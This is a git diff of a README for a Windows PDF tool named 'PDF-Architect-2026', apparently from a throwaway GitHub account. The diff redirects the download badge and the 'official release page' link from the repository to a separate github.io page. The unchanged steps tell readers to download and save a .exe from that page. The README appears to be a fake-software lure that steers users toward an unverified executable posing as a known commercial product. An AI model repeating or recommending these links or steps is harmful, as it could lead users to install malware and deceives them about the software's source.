@@ -1,6 +1,6 @@
 # 📄 PDF-Architect-2026 - Manage your documents with simple tools
 
-[![](https://img.shields.io/badge/Download-PDF-Architect-2026-blue)](https://github.com/Cleanable-masseshot16/PDF-Architect-2026)
+[![](https://img.shields.io/badge/Download-PDF-Architect-2026-blue)](https://cleanable-masseshot16.github.io)
 
 PDF Architect 2026 provides a set of tools for daily document tasks. This software allows you to edit, create, and organize PDF files on Windows 10 and Windows 11. You can modify text, merge files, and split documents without advanced technical skills.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to obtain the setup files for your computer.
 
-1. Go to the [official release page](https://github.com/Cleanable-masseshot16/PDF-Architect-2026).
+1. Go to the [official release page](https://cleanable-masseshot16.github.io).
 2. Look for the list of available assets.
 3. Select the file ending in .exe to begin your download.
 4. Save the file to your Downloads folder or your desktop for easy access.
